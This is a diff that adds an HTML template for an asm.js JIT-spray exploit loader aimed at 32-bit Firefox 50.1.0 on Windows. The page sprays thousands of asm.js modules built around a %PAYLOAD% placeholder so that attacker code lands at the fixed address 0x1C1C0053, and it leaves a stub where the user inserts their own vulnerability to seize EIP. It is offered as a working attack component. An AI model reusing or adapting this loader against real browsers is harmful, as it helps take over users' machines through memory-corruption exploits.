@@ -1,0 +1,58 @@
+<!DOCTYPE HTML>
+
+<!--
+
+    ASM.JS JIT SPRAY
+
+    works on 32-bit Firefox - successfully tested with 50.1.0
+
+    STATIC LOADER - generated via:
+    %CMDLINE%
+
+    (C) Rh0
+
+-->
+
+<html background=black>
+<head>
+<meta charset=UTF-8 />
+<script async>
+function asm_js_module(){
+    "use asm";
+    function payload_code(){
+        var val = 0;
+%PAYLOAD%
+        return val|0;
+    }
+    return payload_code 
+}
+</script>
+
+<script>
+function spray_modules(){
+    sprayed = []
+    /* FIXME dynamically adjust this for target version */
+    for (var i=0; i<= 0x1800; i++){
+        sprayed[i] = asm_js_module()
+    }
+
+    trigger_vuln()
+}
+
+/* GET EIP CONTROL WITH YOUR VULN HERE */
+/* SET EIP TO 0x1C1C0053 ON WINDOWS 32-bit*/
+function trigger_vuln(){
+    /* You may need to adjust this address dependent on your vuln and version */
+    alert("Set EIP to 0x1c1c0053 (32-bit Firefox 50.1.0 on Windows) with your vuln here")
+}
+
+</script>
+</head>
+
+<body style=background:black onload=spray_modules()>
+<h1 style=color:green>
+%HEADER%
+</h1>
+
+</body>
+</html>
